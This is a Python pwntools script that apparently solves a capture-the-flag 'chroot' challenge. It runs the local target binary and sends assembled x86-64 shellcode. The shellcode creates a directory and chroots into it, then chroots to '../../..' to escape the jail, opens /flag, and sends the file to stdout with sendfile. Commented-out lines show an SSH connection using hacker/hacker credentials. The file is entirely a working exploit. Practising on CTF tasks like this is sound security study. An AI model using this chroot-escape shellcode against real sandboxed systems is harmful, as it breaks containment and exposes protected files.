import os
from base64 import b64encode
from pwn import *

context.arch = 'amd64'

#ssh = paramiko.SSHClient()
#ssh.connect(sys.argv[1], port=sys.argv[2],
#            username='hacker', password='hacker')
#stdin, stdout, stderr = ssh.exec_command('/home/ctf/chroot')
io = process('../deploy/chroot')

# mkdir & chroot to "a"
shellcode = '''
mov rdx, 0x1234500
mov rax, %d
mov [rdx], rax

mov rdi, 0x1234500
mov rsi, 0755
mov rax, 0x53
syscall

mov rdi, 0x1234500
mov rax, 0xa1
syscall
''' % u64('a\0\0\0\0\0\0\0')

# chroot to "../../.."
shellcode += '''
mov rdx, 0x1234500
mov rax, %d
mov [rdx], rax

mov rdi, 0x1234500
mov rax, 0xa1
syscall
''' % u64('../../..')

# open "/flag" and sendfile
shellcode += '''
mov rdx, 0x1234500
mov rax, %d
mov [rdx], rax

mov rdi, 0x1234500
mov rsi, 0
mov rdx, 0
mov rax, 0x2
syscall

mov rdi, 1
mov rsi, 3
mov rdx, 0
mov r10, 0x50
mov rax, 0x28
syscall
''' % u64('/flag\0\0\0')
io.send(asm(shellcode))

#stdin.send(asm(shellcode))
#print(stdout)

io.interactive()
